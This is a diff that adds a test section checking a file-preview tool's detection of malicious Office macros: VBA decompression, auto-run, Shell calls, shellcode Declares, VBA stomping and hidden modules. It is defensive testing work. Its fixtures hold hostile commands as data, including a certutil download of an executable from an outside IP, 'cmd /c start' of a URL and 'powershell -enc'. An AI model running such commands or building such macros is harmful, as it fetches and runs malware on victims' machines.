@@ -25,6 +25,11 @@
  *  10. text (42f): a leaked config's keys found and masked, a dropper read
  *      line by line (its -EncodedCommand decoded), shells; JSON nesting and
  *      XML entities refused before any parser; encodings
+ *  12. macros (42h): MS-OVBA's own example vectors decompressed; DPB values
+ *      Excel wrote decrypted; projects built at run time (tests/lib/vba.mjs)
+ *      in .docm, .doc, .xls, .ppt and OpenDocument Basic read the same way:
+ *      what runs by itself, Shell, the shellcode loader's Declares, VBA
+ *      stomping, hidden modules, a locked project, a form's text
  *  11. programs (42g): real mingw, gcc and clang builds read as pefile,
  *      readelf and llvm-otool read them (imphash included); the hostile PE
  *      built at run time — injection, a packer, an overlay, a forged
@@ -78,6 +83,12 @@ import { capabilities } from "../../web/src/preview/binary/capabilities.ts";
 import { commonNames, entropy } from "../../web/src/preview/binary/read.ts";
 import { findBytes } from "../../web/src/preview/binary/find.ts";
 import { binaryFacts } from "../../web/src/preview/facts/binary.ts";
+import { decompress, decryptValue } from "../../web/src/preview/vba/ovba.ts";
+import { pcodeStrings, readVba } from "../../web/src/preview/vba/project.ts";
+import { macrosInOle, macrosInPpt, macrosInZip } from "../../web/src/preview/vba/macros.ts";
+import { triage } from "../../web/src/preview/vba/triage.ts";
+import { macroFacts, withMacros } from "../../web/src/preview/facts/vba.ts";
+import { compress, encryptValue, hostileProject, oleWithVba, odfWithBasic, pcode, pptWithVba, vbaProject, withVba } from "../lib/vba.mjs";
 
 const fixture = (name: string) => new Uint8Array(readFileSync(new URL(`../fixtures/preview/${name}`, import.meta.url)));
 const said = (facts: { text: string }[]) => facts.map((f) => f.text).join("\n");
@@ -672,4 +683,76 @@ assert.deepEqual([findBytes(hay, new TextEncoder().encode("MZ"), 1, 1), findByte
 assert.equal(imphash([{ dll: "OLEAUT32.dll", names: ["#2"], delayed: false }]), null, "an oleaut32 ordinal: no imphash rather than a wrong one");
 assert.equal(versionStrings(new Uint8Array(10)), null);
 
-console.log("ok  preview-facts: ZIP bombs refused (a lying part, an over-claiming directory); every planted trick in the hostile Word, Excel, PowerPoint, 한글, .doc and RTF fixtures named — and the honest reports warn of nothing; the phishing .eml's and .msg's every trick named, the forged Authentication-Results not believed, the hop the sender could not write found, a forwarded message parsed in turn, attachments judged by name and bytes; pictures sniffed by their bytes, a bomb's size read before decoding, what follows a picture's end named, a RAW file's own previews found, GPS, the camera and the editing read, a thumbnail that no longer matches named; archives read by our ZIP, ALZ and EGG readers and by 7-Zip (7z, RAR 5, TAR in three compressions, CAB, ISO, ARJ, LZH, zstd), CP949 names, ZipCrypto and AES opened and wrong passwords refused, liars and bombs stopped, AZO listed and not opened, and every lure's trick named; text: secrets found and masked (placeholders not), a dropper's every line named and its -EncodedCommand decoded, a reverse shell, a web shell, encoded and obfuscated scripts; JSON nesting refused before parsing, JSON Lines counted, XML entities and outside DTDs named and never parsed; Korean and UTF-16 text decoded; programs: mingw, gcc and clang builds read as pefile, readelf and llvm-otool read them (imphash, version, exports, ad hoc signature), the hostile PE's injection, packer, overlay, forged signature and ransom strings named, cut-short headers said and never thrown");
+// ── 12. Macros (42h) ─────────────────────────────────────────────────
+// [MS-OVBA] 3.2's own examples: no compression, normal, maximum.
+const hexb = (h: string) => Uint8Array.from(h.split(" ").map((x) => parseInt(x, 16)));
+const dec = (h: string) => new TextDecoder().decode(decompress(hexb(h))!);
+assert.equal(dec("01 19 B0 00 61 62 63 64 65 66 67 68 00 69 6A 6B 6C 6D 6E 6F 70 00 71 72 73 74 75 76 2E"), "abcdefghijklmnopqrstuv.");
+assert.equal(dec("01 2F B0 00 23 61 61 61 62 63 64 65 82 66 00 70 61 67 68 69 6A 01 38 08 61 6B 6C 00 30 6D 6E 6F 70 06 71 02 70 04 10 72 73 74 75 76 10 77 78 79 7A 00 3C"), "#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa");
+assert.equal(dec("01 03 B0 02 61 45 00"), "a".repeat(73));
+// Our compressor (the fixtures' writer) round-trips through the reader, over chunks.
+for (const text of ["", "x", "Attribute VB_Name = \"Module1\"\r\n".repeat(400), Array.from({ length: 9000 }, (_, i) => String.fromCharCode(32 + ((i * 7919) % 95))).join("")]) assert.equal(new TextDecoder().decode(decompress(compress(new TextEncoder().encode(text)))!), text, `round trip of ${text.length} bytes`);
+assert.equal(decompress(new Uint8Array([2, 0, 0])), null, "not a compressed container");
+assert.ok(decompress(compress(new TextEncoder().encode("a".repeat(100000))), 1000)!.length <= 1000, "capped");
+// The values Excel itself wrote into a project's PROJECT stream (XlsxWriter's example): no password.
+assert.deepEqual([...decryptValue("DBD966ECE4F0E4F0E4F0E4F0")!], [0, 0, 0, 0], "CMG");
+assert.deepEqual([...decryptValue("5557E86E18E919E919E9")!], [0], "DPB: one zero byte — no password");
+assert.deepEqual([...decryptValue("CFCD72F0961011111111EE")!], [255], "GC");
+assert.deepEqual([...decryptValue(encryptValue(Uint8Array.from([1, 2, 3, 4, 5]), 0x2e))!], [1, 2, 3, 4, 5]);
+
+// A project built now, read back in every container Office uses.
+const project = hostileProject();
+const vb = readVba(Ole.open(project)!)!;
+assert.deepEqual(vb.modules.map((x) => [x.name, x.kind, x.hidden]), [["ThisDocument", "document", false], ["Module1", "module", false], ["Helper", "module", true], ["Stomped", "module", false], ["UserForm1", "class", false]]);
+assert.equal(vb.locked, true, "DPB decrypts to a password's hash");
+assert.match(vb.modules[1]!.source, /^Attribute VB_Name = "Module1"\nSub Run1\(\)/);
+assert.deepEqual(vb.modules[3]!.unseen, ["certutil -urlcache -f http://198.51.100.4/x.exe"], "compiled code that says what the source does not");
+assert.deepEqual(vb.modules[4]!.formText, ["cmd /c start http://198.51.100.4/next"]);
+const containers = {
+	".docm": macrosInZip(Zip.open(withVba(fixture("report.docx"), project))!),
+	".xlsm": macrosInZip(Zip.open(withVba(fixture("report.xlsx"), project))!),
+	".pptm": macrosInZip(Zip.open(withVba(fixture("report.pptx"), project))!),
+	".doc (Macros/)": macrosInOle(Ole.open(oleWithVba(fixture("report.doc"), project, "Macros/"))!),
+	".xls (_VBA_PROJECT_CUR/)": macrosInOle(Ole.open(oleWithVba(fixture("report.xls"), project, "_VBA_PROJECT_CUR/"))!),
+	".ppt (zlib in ExOleObjStg)": macrosInPpt(Ole.open(pptWithVba(fixture("report.ppt"), project))!),
+};
+for (const [where, m] of Object.entries(containers)) assert.deepEqual(m?.modules.map((x) => x.name), ["ThisDocument", "Module1", "Helper", "Stomped", "UserForm1"], where);
+const vf = said(macroFacts(containers[".docm"]!));
+for (const want of [
+	/^Contains macros — a VBA project: 5 modules/m,
+	/Runs by itself when the file is opened: Document_Open \(ThisDocument, line 7\)/,
+	/Module1, line 5: it runs a program \(Shell\) — “Shell s, vbHide”/,
+	/Module1, line 4: it downloads from the internet/,
+	/Calls Windows directly: VirtualAlloc \(kernel32\) — the calls that load shellcode/,
+	/VBA stomping: Stomped's compiled code holds text its source never says — “certutil/,
+	/hidden from the VBA editor .*: Helper/,
+	/UserForm1's controls hold text .*“cmd \/c start/,
+	/Locked for viewing in the VBA editor/,
+	/Its text: it fetches a file with certutil/,
+]) assert.match(vf, want);
+assert.doesNotMatch(vf, /UserForm_Initialize/, "Initialize runs when a form is shown, not by itself");
+// A source wiped beside compiled code: stomped outright.
+const wiped = readVba(Ole.open(vbaProject({ modules: [{ name: "Module1", kind: "module", source: "", compiled: pcode(["powershell -enc AAAA"]) }] }))!)!;
+assert.equal(wiped.modules[0]!.stomped, true);
+assert.match(said(macroFacts({ kind: "a VBA project", modules: wiped.modules, locked: false, signed: false, warnings: [] })), /VBA stomping: Module1's source is gone, but its compiled code \(\d+ bytes\) remains/);
+// An honest macro: what it is, and nothing else to warn of.
+const honest = readVba(Ole.open(vbaProject({ modules: [{ name: "Module1", kind: "module", source: 'Sub say_hello()\n    MsgBox ("Hello from Gorani")\nEnd Sub\n' }] }))!)!;
+assert.equal(honest.locked, false);
+assert.deepEqual(honest.modules[0]!.unseen, [], "its literal is in its source");
+assert.equal(said(macroFacts({ kind: "a VBA project", modules: honest.modules, locked: false, signed: false, warnings: [] })), "Contains macros — a VBA project: 1 module (Module1) — none of it was run; the Macros button shows the source");
+// OpenDocument's StarBasic.
+const odm = macrosInZip(Zip.open(odfWithBasic(fixture("report.odt"), "Module1", 'Sub Main\n  Shell("cmd /c calc.exe", 1)\nEnd Sub\n'))!)!;
+assert.equal(odm.kind, "LibreOffice Basic");
+assert.match(said(macroFacts(odm)), /Standard\.Module1, line 2: it runs a program \(Shell\)/);
+// The triage's rules, one at a time.
+const tri = (source: string) => triage([{ name: "M", stream: "", kind: "module", source, compiled: 0, unseen: [], hidden: false, stomped: false, formText: [] }]);
+assert.deepEqual(tri("Sub InkPicture1_Painted(ByVal h As Long)\nEnd Sub\nSub Workbook_BeforeClose(c As Boolean)\nEnd Sub").autorun.map((a) => [a.what, a.when]), [["InkPicture1_Painted", "control"], ["Workbook_BeforeClose", "close"]]);
+assert.deepEqual(tri("' Shell \"calc\"\nRem CreateObject(\"x\")").findings, [], "comments are skipped");
+assert.match(tri(Array.from({ length: 30 }, () => "s = s & Chr(65)").join("\n")).obfuscation.join(), /30 characters built one at a time/);
+assert.deepEqual(pcodeStrings(Uint8Array.from([0, 0, 5, 0, ...new TextEncoder().encode("hello"), 0, 3, 0, 65, 66, 67])), ["hello"], "a literal is its length and its text (four or more)");
+// The generic line gives way to what the macros say.
+assert.equal(said(withMacros([{ level: "info", text: "A document" }, { level: "warn", text: "Contains macros (a VBA project) — none of it was run" }], honest.modules.length ? { kind: "a VBA project", modules: honest.modules, locked: false, signed: false, warnings: [] } : null)).split("\n")[1], "Contains macros — a VBA project: 1 module (Module1) — none of it was run; the Macros button shows the source");
+// A module opened as text keeps its triage.
+assert.match(tf("Helper.bas", 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" () As LongPtr\nSub AutoOpen()\nEnd Sub'), /Line 2: AutoOpen runs by itself \(on open\)[\s\S]*Calls Windows directly: VirtualAlloc \(kernel32, line 1\)/);
+
+console.log("ok  preview-facts: ZIP bombs refused (a lying part, an over-claiming directory); every planted trick in the hostile Word, Excel, PowerPoint, 한글, .doc and RTF fixtures named — and the honest reports warn of nothing; the phishing .eml's and .msg's every trick named, the forged Authentication-Results not believed, the hop the sender could not write found, a forwarded message parsed in turn, attachments judged by name and bytes; pictures sniffed by their bytes, a bomb's size read before decoding, what follows a picture's end named, a RAW file's own previews found, GPS, the camera and the editing read, a thumbnail that no longer matches named; archives read by our ZIP, ALZ and EGG readers and by 7-Zip (7z, RAR 5, TAR in three compressions, CAB, ISO, ARJ, LZH, zstd), CP949 names, ZipCrypto and AES opened and wrong passwords refused, liars and bombs stopped, AZO listed and not opened, and every lure's trick named; text: secrets found and masked (placeholders not), a dropper's every line named and its -EncodedCommand decoded, a reverse shell, a web shell, encoded and obfuscated scripts; JSON nesting refused before parsing, JSON Lines counted, XML entities and outside DTDs named and never parsed; Korean and UTF-16 text decoded; programs: mingw, gcc and clang builds read as pefile, readelf and llvm-otool read them (imphash, version, exports, ad hoc signature), the hostile PE's injection, packer, overlay, forged signature and ransom strings named, cut-short headers said and never thrown; macros: MS-OVBA's own vectors, Excel's own DPB values, projects in .docm, .xlsm, .pptm, .doc, .xls, .ppt and OpenDocument Basic read alike — auto-run, Shell, the shellcode Declares, stomping, hidden modules, a locked project, a form's text");
